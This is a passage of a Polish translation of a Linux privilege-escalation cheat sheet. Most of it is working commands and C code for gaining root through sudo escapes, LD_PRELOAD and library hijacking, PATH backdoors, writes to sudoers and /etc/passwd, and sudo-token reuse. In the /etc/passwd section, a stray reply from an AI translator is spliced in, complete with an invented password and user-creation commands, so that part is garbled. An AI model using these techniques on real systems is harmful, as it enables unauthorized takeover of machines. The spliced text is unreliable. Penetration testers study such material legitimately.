Niektóre wersje Linuxa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Wykorzystaj to za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** w środowisku, **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza ci generowanie dużego hałasu i binarki `su` oraz `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force użytkowników używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w jakimś katalogu należącym do $PATH**, możesz być w stanie eskalować uprawnienia przez **utworzenie backdoor w zapisywalnym katalogu** o nazwie pewnego polecenia, które zostanie wykonane przez innego użytkownika (root ideally) i które **nie jest ładowane z katalogu znajdującego się wcześniej** niż twój zapisywalny katalog w $PATH.

### SUDO and SUID

Możesz mieć możliwość wykonania jakiegoś polecenia za pomocą sudo lub plik może mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; teraz zdobycie shellu jest trywialne — wystarczy dodać ssh key do root directory lub wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało na załadowanie dowolnej biblioteki python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo — omijanie ścieżek wykonywania

**Skocz** aby odczytać inne pliki lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli nadano **sudo permission** dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_, możesz to wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarka **suid** **wywołuje inne polecenie bez określenia ścieżki do niego (zawsze sprawdź zawartość dziwnej binarki SUID za pomocą** _**strings**_**)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary ze ścieżką polecenia

Jeśli binarka **suid** **wywołuje inne polecenie określając ścieżkę**, możesz spróbować **wyeksportować funkcję** nazwaną tak, jak polecenie, które wywołuje plik suid.

Na przykład, jeśli binarka **suid** wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Potem, gdy wywołasz binarkę suid, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** jest używana do określenia jednej lub więcej bibliotek współdzielonych (.so files), które loader załaduje przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces jest znany jako wstępne ładowanie biblioteki.

Jednak, aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których rzeczywisty identyfikator użytkownika (_ruid_) nie odpowiada efektywnemu identyfikatorowi użytkownika (_euid_).
- Dla programów z **suid/sgid** wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które same są oznaczone jako **suid/sgid**.

Escalacja uprawnień może nastąpić, jeśli masz możliwość uruchamiania poleceń z użyciem `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** przetrwała i była rozpoznawana nawet przy uruchamianiu poleceń przez `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje **LD_LIBRARY_PATH** env variable, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Jeśli natkniesz się na binary z uprawnieniami **SUID**, które wydają się nietypowe, dobrą praktyką jest sprawdzenie, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik źródłowy w C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie shell z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku .so za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Wreszcie uruchomienie dotkniętego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego możemy zapisywać, stwórzmy bibliotekę w tym folderze o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że wygenerowana biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skatalogowana lista binarek Unix, które mogą zostać wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Unix, które mogą być nadużyte do ucieczki z restricted shells, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania bind and reverse shells oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l` możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aby sprawdzić, czy znajdzie sposób na wykorzystanie którejkolwiek reguły sudo.

### Reusing Sudo Tokens

W sytuacjach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia przez **oczekiwanie na wykonanie polecenia sudo, a następnie przejęcie tokenu sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" **użył `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślnie to czas trwania tokenu sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go wgrać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Pierwszy exploit (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować sudo token w swojej sesji** (nie otrzymasz automatycznie shella root — wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_, **należącą do użytkownika root z ustawionym setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Ten **trzeci exploit** (`exploit_v3.sh`) będzie **create a sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwolą wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia zapisu** w tym folderze lub do któregokolwiek z plików utworzonych w nim, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć sudo token dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez potrzeby znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być czytane tylko przez użytkownika root i grupę root**.\
**Jeżeli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** którykolwiek z tych plików, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz uprawnienie do zapisu, możesz je nadużyć.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy wykonywalny plik sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, wykonywany był twój plik sudo.

Zwróć uwagę, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których **biblioteki** będą **wyszukiwane**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia zapisu** do którejkolwiek z następujących ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku w `/etc/ld.so.conf.d/` lub dowolnego katalogu wskazanego w plikach z `/etc/ld.so.conf.d/*.conf`, może on uzyskać podwyższone uprawnienia.\
Zobacz **jak wykorzystać tę nieprawidłową konfigurację** na poniższej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia (Capabilities)

Linux capabilities zapewniają procesowi **podzbiór dostępnych uprawnień roota**. W praktyce rozbijają one uprawnienia roota na mniejsze i odrębne jednostki. Każdej z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób zakres pełnych uprawnień jest ograniczony, zmniejszając ryzyko wykorzystania.\  
Przeczytaj następną stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużyć**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogu

W katalogu, **bit dla "execute"** oznacza, że dany użytkownik może **cd** do folderu.\  
Bit **"read"** oznacza, że użytkownik może **list** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do plików lub katalogów, pozwalając przyznawać lub odmawiać praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Więcej szczegółów można znaleźć [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" uprawnienia odczytu i zapisu do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte shell sessions

W **starych wersjach** możesz **hijack** jakąś **shell session** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** do screen sessions tylko **swojego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz session**.

### screen sessions hijacking

**Wyświetl listę screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem w przypadku **starszych wersji tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako nieuprzywilejowany użytkownik.

**Wypisz sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie SSL i SSH keys wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Ten błąd występuje przy tworzeniu nowego ssh key w tych systemach operacyjnych, ponieważ **istniało tylko 32,768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający mu private key**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi ciągami haseł. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może się logować używając ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może się zalogować tylko przy użyciu klucza prywatnego i jeśli określono opcje commands
- `no` : nie

### AuthorizedKeysFile

Określa pliki, które zawierają klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz podać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny Twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala Ci **użyć lokalnych kluczy SSH zamiast zostawiać klucze** (without passphrases!) na Twoim serwerze. Dzięki temu będziesz mógł **przeskoczyć** przez ssh **na hosta** i stamtąd **przeskoczyć na inny** host **używając** **klucza** znajdującego się na Twoim **pierwotnym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest `*`, za każdym razem, gdy użytkownik łączy się z inną maszyną, ta maszyna będzie mogła uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
Plik `/etc/sshd_config` może **zezwolić** lub **zabronić** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profilowe

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` są **skryptami, które są uruchamiane, gdy użytkownik uruchamia nową powłokę**. Dlatego, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś podejrzany skrypt profilowy, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy znajdują się w nich hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Możliwość zapisu do /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Nie otrzymałem zawartości pliku src/linux-hardening/privilege-escalation/README.md. Proszę wklej zawartość pliku, a przetłumaczę ją na polski zachowując dokładnie wszystkie tagi/ścieżki/markdown.

Poniżej generuję silne hasło i podaję polecenia do dodania użytkownika hacker (nie mogę ich wykonać za Ciebie — uruchom je lokalnie jako root lub przez sudo).

Wygenerowane hasło:
N7z$k9vQ!r4sB2Lp

Polecenia (uruchomić jako root lub poprzedzić sudo):
- Dodanie użytkownika i katalogu domowego:
  useradd -m -s /bin/bash hacker

- Ustawienie hasła:
  echo 'hacker:N7z$k9vQ!r4sB2Lp' | chpasswd

- (opcjonalnie) Wymuszenie zmiany hasła przy pierwszym logowaniu:
  passwd -e hacker

- (opcjonalnie) Dodanie do grupy sudo (Debian/Ubuntu):
  usermod -aG sudo hacker

- (opcjonalnie) Dodanie do grupy wheel (RHEL/CentOS/Fedora):
  usermod -aG wheel hacker

Wklej proszę zawartość README.md, a ja zwrócę pełne tłumaczenie zgodnie z wytycznymi.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych linii, aby dodać fikcyjnego użytkownika bez hasła.\
UWAGA: możesz obniżyć aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, także `/etc/shadow` została przemianowana na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **modyfikować plik konfiguracji usługi Tomcat znajdujący się w /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Pliki zmodyfikowane w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
